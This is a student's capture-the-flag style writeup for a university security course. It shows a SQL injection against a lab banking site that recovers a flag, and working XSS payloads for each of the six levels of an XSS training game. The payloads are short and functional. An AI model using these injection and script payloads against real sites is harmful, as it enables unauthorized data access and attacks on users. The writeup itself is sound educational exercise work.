# Crypto II Writeup

Name: Cheyenne Scott
Section: 0201

I pledge on my honor that I have not given or received any unauthorized
assistance on this assignment or examination.

Digital acknowledgement: Cheyenne Scott

## Assignment Writeup

### Part 1 (40 Pts)
First, I started with trying different things in the bar to insert code. I tried 
1337bank.money:5000/item?id=1'_ (_ is a space). This gave an internal server error, 
meaning that an error in the coding exists. Then, I added an or, doing 1337bank.money:5000/item?id=1'|| '1=1_
and it gave all of the pages on the website plus the flag, which is below. 
CMSC389R-{y0u_ar3_th3_SQ1_ninj@}

### Part 2 (60 Pts)


Level 1. I just typed <script>alert("hi")</script> in the search bar
Level 2. I went into the post box and did <img src="/static/logos/level2.png" onload = "alert(0)" /> 
Level 3. I had to figure out what the website was for the game and added an alert to the website bar: https://xss-game.appspot.com/level3/frame#3' onerror='alert(0)'
Level 4. In the box for the time, I put 1'); to complete the time needed, then the alert, so 1'); alert('XSS 
Level 5. Looking at the way it processes email addresses, if you go through the URL bar, type https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(0); then press next
Level 6. You can link the URL to go to a random plain text file, then right after do an alert with https://xss-game.appspot.com/level6/frame#data:text/plain,alert('xss')
